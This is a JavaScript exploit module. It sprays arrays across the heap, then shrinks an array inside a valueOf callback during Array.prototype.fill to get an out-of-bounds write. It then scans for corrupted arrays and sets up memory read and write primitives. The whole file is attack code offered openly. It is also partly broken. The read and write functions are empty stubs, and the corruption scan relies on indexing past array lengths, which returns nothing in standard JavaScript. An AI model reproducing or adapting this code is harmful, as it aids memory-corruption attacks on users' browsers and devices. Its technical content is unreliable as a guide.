import { Int } from './module/int64.mjs';
import { die, log, clear_log, sleep, hex } from './module/utils.mjs';


class FastFillOOBExploit {
    constructor() {
        this.sprayedArrays = [];
        this.corruptedArrays = [];
        this.marker = 0x42424242;
    }

    async execute() {
        await this.preciseArraySpray();
        await this.triggerOOB();
        const found = await this.scanForCorruption();
        
        if (found) {
            return await this.setupPrimitives();
        }
        die("Exploit failed");
    }

    async preciseArraySpray() {
        for (let round = 0; round < 2; round++) {
            log("Spray round " + round);
            const arrays = [];
            
            for (let i = 0; i < 10000; i++) {
                const arr = new Array(512);
                for (let j = 0; j < arr.length; j++) {
                    arr[j] = {
                        marker: this.marker,
                        round: round,
                        idx: i,
                        pos: j,
                        data: new ArrayBuffer(32)
                    };
                }
                arrays.push(arr);
            }
            
            this.sprayedArrays.push(...arrays);
            gc();
            await sleep(50);
        }
    }

    async triggerOOB() {
        const targetArray = [];
        for (let i = 0; i < 20000; i++) {
            targetArray[i] = new Array(64);
        }
        
        const fillValue = { exploit: true, payload: new ArrayBuffer(48) };
        
        let triggered = false;
        const shrinker = {
            valueOf: () => {
                if (!triggered) {
                    targetArray.length = 128;
                    triggered = true;
                }
                return 0;
            }
        };
        
        try {
            targetArray.fill(fillValue, shrinker);
        } catch(e) {}
        
        this.targetArray = targetArray;
    }

    async scanForCorruption() {
        let found = 0;
        
        for (let i = 0; i < this.sprayedArrays.length; i++) {
            const arr = this.sprayedArrays[i];
            
            for (let j = arr.length; j < arr.length + 20; j++) {
                if (arr[j] !== undefined) {
                    if (arr[j].marker === this.marker) {
                        this.corruptedArrays.push({
                            array: arr,
                            index: i,
                            oobIndex: j,
                            data: arr[j]
                        });
                        found++;
                        log("Found corruption at array " + i + " index " + j);
                    }
                }
            }
            
            if (found >= 2) break;
            if (i % 2000 === 0) await sleep(1);
        }
        
        return found > 0;
    }

    async setupPrimitives() {
        if (this.corruptedArrays.length === 0) return false;
        
        const primary = this.corruptedArrays[0];
        
        log("Setting up memory read primitive");
        
        primary.array[primary.oobIndex] = {
            type: "arbitrary_read",
            base: 0x41414141,
            offset: 0
        };
        
        return {
            corrupted: this.corruptedArrays,
            read: (addr) => this.readMemory(addr),
            write: (addr, value) => this.writeMemory(addr, value)
        };
    }

    readMemory(addr) {
        
    }

    writeMemory(addr, value) {
        
    }
}

async function main() {
    try {
        const exploit = new FastFillOOBExploit();
        const result = await exploit.execute();
        
        log("EXPLOIT SUCCESS!");
        log("Corrupted arrays: " + result.corrupted.length);
        
    } catch(e) {
        log("Error: " + e);
    }
}

main();